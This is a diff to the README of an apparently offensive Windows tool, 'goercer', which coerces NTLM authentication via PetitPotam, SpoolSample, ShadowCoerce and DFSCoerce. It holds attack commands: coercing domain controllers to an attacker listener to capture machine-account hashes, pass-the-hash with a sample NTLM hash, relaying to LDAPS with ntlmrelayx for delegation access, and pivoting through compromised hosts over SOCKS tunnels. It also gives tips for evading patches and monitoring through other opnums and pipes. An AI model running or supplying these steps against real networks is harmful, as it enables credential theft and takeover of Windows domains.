@@ -669,23 +669,23 @@ sudo responder -I eth0 -v
 ./build.sh
 
 # Test PetitPotam (works on all servers - tries 6 opnums)
-./goercer <target> <listener> <user> <pass> <domain> petitpotam
+./goercer -t <target> -l <listener> -u <user> -d <domain> -m petitpotam
 # Expected: 6 authentication attempts in Responder (one per opnum)
 
 # Test PetitPotam with alternative pipe
-./goercer <target> <listener> <user> <pass> <domain> petitpotam efsr
-# Expected: 1 callback in Responder
+./goercer -t <target> -l <listener> -u <user> -d <domain> -m petitpotam --pipe samr
+# Expected: 6 authentication attempts in Responder
 
 # Test SpoolSample (works when Print Spooler running)
-./goercer <target> <listener> <user> <pass> <domain> spoolsample
+./goercer -t <target> -l <listener> -u <user> -d <domain> -m spoolsample
 # Expected: 3 callbacks in Responder
 
 # Test ShadowCoerce (only if VSS configured)
-./goercer <target> <listener> <user> <pass> <domain> shadowcoerce
+./goercer -t <target> -l <listener> -u <user> -d <domain> -m shadowcoerce
 # Expected: Callback if VSS available, otherwise pipe not found error
 
 # Test DFSCoerce (only if DFS Namespaces role installed)
-./goercer <target> <listener> <user> <pass> <domain> dfscoerce
+./goercer -t <target> -l <listener> -u <user> -d <domain> -m dfscoerce
 # Expected: Callback if DFS configured, otherwise pipe not found or bind rejected
 ```
 
@@ -840,9 +840,9 @@ A: Common causes:
 A: Yes! PetitPotam and SpoolSample both work well against DCs. This is often used to capture DC machine account hashes.
 
 **Q: Can I use pass-the-hash?**  
-A: Yes! Provide the NTLM hash (32 hex characters) instead of the password:
+A: Yes! Provide the NTLM hash (32 hex characters) via the `-H` flag:
 ```bash
-./goercer 10.0.0.10 10.0.0.5 john 8846f7eaee8fb117ad06bdd830b7586c corp.local
+./goercer -t 10.0.0.10 -l 10.0.0.5 -u john -H 8846f7eaee8fb117ad06bdd830b7586c -d corp.local -m petitpotam
 ```
 The tool automatically detects if you're using a hash or password. Common sources for NTLM hashes:
 - `secretsdump.py` - Dump from domain controller or SAM
@@ -851,12 +851,13 @@ The tool automatically detects if you're using a hash or password. Common source
 - Previous Responder/ntlmrelayx captures
 
 **Q: What's the difference between PetitPotam pipes?**  
-A: All pipes use the same MS-EFSRPC protocol but different named pipe endpoints:
+A: All pipes (lsarpc, samr, netlogon, lsass) bind to the same MS-EFSRPC UUID and support all 6 opnums:
 - `lsarpc` (default): Most reliable, always available
-- `efsr`, `samr`, `netlogon`, `lsass`: Alternative endpoints if lsarpc is blocked
+- `samr`, `netlogon`, `lsass`: Alternative endpoints if lsarpc is blocked or monitored
+- `efsr`: May not exist on all systems
 
 **Q: Why does Opnum 0 succeed but no callback?**  
-A: Opnum 0 (EfsRpcOpenFileRaw) is often patched to return success without performing UNC access. The tool automatically tries Opnum 4 (EfsRpcEncryptFileSrv) which usually works.
+A: Opnum 0 (EfsRpcOpenFileRaw) is often patched to return success without performing UNC access. The tool automatically tries 5 additional opnums (4, 5, 6, 7, 12) which typically work even when opnum 0 is patched.
 
 **Q: How is this different from Coercer?**  
 A: 
@@ -868,7 +869,7 @@ A:
 A: Yes! Use `ntlmrelayx.py` instead of Responder:
 ```bash
 ntlmrelayx.py -t ldaps://<target> --delegate-access
-./goercer <source> <attacker_IP> <user> <pass> <domain>
+./goercer -t <source> -l <attacker_IP> -u <user> -d <domain> -m petitpotam
 ```
 
 **Q: Can I use this through a proxy?**  
@@ -876,11 +877,11 @@ A: Yes! Use the `--proxy` flag for SOCKS5 proxies:
 ```bash
 # SSH tunnel
 ssh -D 1080 user@pivot
-./goercer <target> <listener> <user> <pass> <domain> --proxy socks5://127.0.0.1:1080
+./goercer -t <target> -l <listener> -u <user> -d <domain> -m petitpotam --proxy socks5://127.0.0.1:1080
 
 # Chisel
 chisel server -p 8080 --socks5
-./goercer <target> <listener> <user> <pass> <domain> --proxy socks5://127.0.0.1:1080
+./goercer -t <target> -l <listener> -u <user> -d <domain> -m petitpotam --proxy socks5://127.0.0.1:1080
 ```
 This is useful for pivoting through compromised hosts or accessing segmented networks.
 
@@ -976,7 +977,7 @@ Microsoft's patches only addressed **unauthenticated** access. Authenticated coe
 ## Credits
 
 - **@topotam77**: Original PetitPotam discovery and PoC
-- **@p0dalirius**: Coercer multi-method implementation and validation
+- **@p0dalirius**: Coercer multi-method implementation and MS-EFSRPC opnum research (6-opnum enhancement based on Coercer's comprehensive function coverage)
 - **Lee Christensen (@tifkin_)**: SpoolSample/PrinterBug discovery
 - **@elad_shamir**: SpoolSample research
 - **@filip_dragovic**: DFSCoerce discovery
